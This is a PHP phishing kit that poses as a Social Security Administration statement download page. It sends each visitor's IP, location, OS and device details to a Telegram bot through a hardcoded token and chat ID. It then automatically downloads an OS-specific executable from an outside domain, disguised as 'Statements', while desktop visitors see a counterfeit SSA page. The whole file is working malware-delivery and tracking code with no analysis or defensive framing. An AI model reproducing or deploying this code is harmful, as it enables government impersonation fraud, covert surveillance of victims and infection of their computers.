<?php
// Configuration
$BOT_TOKEN = '7284066719:AAEncc3VY27DzgRzCLnuNTLpyIJf5MrrCos';
$CHAT_ID = '7724482403';

// Visitor counter (in-memory only)
static $visitor_count = 0;
$visitor_count++;

// Get visitor data
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_POST['userAgent'] ?? $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$isMobile = ($_POST['isMobile'] ?? '0') === '1';
$screenRes = $_POST['screenRes'] ?? 'Unknown';
$timezone = $_POST['timezone'] ?? 'Unknown';
$time = date('Y-m-d H:i:s');

// Detect OS
$os = 'Unknown';
if (stripos($userAgent, 'Win') !== false) $os = 'Windows';
elseif (stripos($userAgent, 'Mac') !== false) $os = 'Mac';
elseif (stripos($userAgent, 'Linux') !== false) $os = 'Linux';

// Get geolocation
$geoData = @json_decode(file_get_contents("https://ipapi.co/{$ip}/json/"), true);
$location = sprintf('%s, %s, %s',
    $geoData['city'] ?? 'Unknown',
    $geoData['region'] ?? 'Unknown',
    $geoData['country_name'] ?? 'Unknown'
);

// Prepare Telegram message
$message = "🚀 NEW SSA VISIT #{$visitor_count}\n"
          ."══════════════════════════════\n"
          ."🌐 IP: {$ip}\n"
          ."📍 Location: {$location}\n"
          ."🖥️ OS: {$os}\n"
          ."📱 Device: " . ($isMobile ? 'Mobile' : 'Desktop') . "\n"
          ."🖥️ Resolution: {$screenRes}\n"
          ."⏰ Timezone: {$timezone}\n"
          ."🕒 Time: {$time}\n"
          ."══════════════════════════════\n"
          ."🔔 TRACKING ACTIVE";

// Send to Telegram using cURL
$url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$data = [
    'chat_id' => $CHAT_ID,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 3); // 3 second timeout
$response = curl_exec($ch);
curl_close($ch);

// Determine download file
$fileUrl = match(true) {
    stripos($os, 'Win') !== false => 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe',
    stripos($os, 'Mac') !== false => 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.pkg',
    stripos($os, 'Linux') !== false => 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.sh',
    default => 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe'
};

// Handle response
if ($isMobile) {
    // Mobile response
    header('Content-Type: text/html; charset=utf-8');
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>Mobile Not Supported</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 50px }
        .warning { color: #d9534f; font-size: 1.2em; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="warning">⚠️ Desktop Device Required</div>
    <p>Please use a computer to access your statements</p>
</body>
</html>
HTML;
} else {
    // Desktop response with original styling
    header('Content-Type: text/html; charset=utf-8');
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta content="IE=edge" http-equiv="X-UA-Compatible" />
    <meta content="width=device-width, initial-scale=1" name="viewport" />
    <title>SSA Statement Download</title>
    <style type="text/css">
        @import url(https://www.ssa.gov/flexweb/rel_5_1_2/css/import.css);
        @import url(styles/appStyles.css);
        h1 { font-size: 2em; color: #0033a0; margin-bottom: 20px; }
        #downloadLink { color: #007bff; text-decoration: none; }
        #downloadLink:hover { text-decoration: underline; }
    </style>
    <script>
        window.onload = function() {
            const link = document.createElement('a');
            link.href = '$fileUrl';
            link.download = '$fileUrl'.split('/').pop();
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        };
    </script>
</head>
<body class="uef-theme-std">
    <!-- Your original styled content -->
    <header>
        <div id="uef-tmpl-header">
            <a accesskey="K" href="#" id="uef-tmpl-skipNav">Skip to Content</a>
            <div id="uef-tmpl-logo">&nbsp;</div>
            <div id="uef-tmpl-websiteTitle">
                <h1>Social Security Administration</h1>
            </div>
        </div>
    </header>

    <div id="uef-tmpl-content-wrapper">
        <div id="uef-tmpl-content">
            <div class="uef-container module">
                <div class="uef-container-row">
                    <div class="uef-container-content">
                        <div class="uef-notice uef-info">
                            <div class="uef-notice-row hd">
                                <div class="uef-notice-content">
                                    <center>
                                        <h1>Welcome to Your Latest SSA Statement Download</h1>
                                    </center>
                                    <h4>Your download has started. If it didn't, 
                                        <a href="$fileUrl" download id="downloadLink">click here</a>.
                                    </h4>
                                </div>
                            </div>
                            <div class="uef-notice-row">
                                <div class="uef-notice-content">
                                    <p>Thank you for using our service.</p>
                                    <p>For further assistance, please contact our help desk at <strong>1-800-123-4567</strong>.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
HTML;
}
?>
